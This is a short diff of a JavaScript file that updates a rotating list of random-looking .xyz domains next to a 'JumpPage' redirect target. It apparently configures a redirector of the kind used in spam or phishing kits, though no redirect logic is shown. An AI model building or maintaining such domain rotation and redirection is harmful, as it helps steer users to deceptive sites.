@@ -42,14 +42,11 @@ var emails = [
 var urls=[".brnohmbd.net",".kwncgug.com",".uyqtwfwm.com",".zzhwoyv.com"];
 
 var urls=[];
+        urls.push(".qybegmsh.xyz");
         urls.push(".fftfbhkf.xyz");
-        urls.push(".kjmyxwux.xyz"); 
-        urls.push(".nhtdzkfh.xyz");
+        urls.push(".ifnvgms.xyz"); 
        
-         
-        
-      
-            
+       
            
 var JumpPage="https://fiwnttsm.xyz";
 
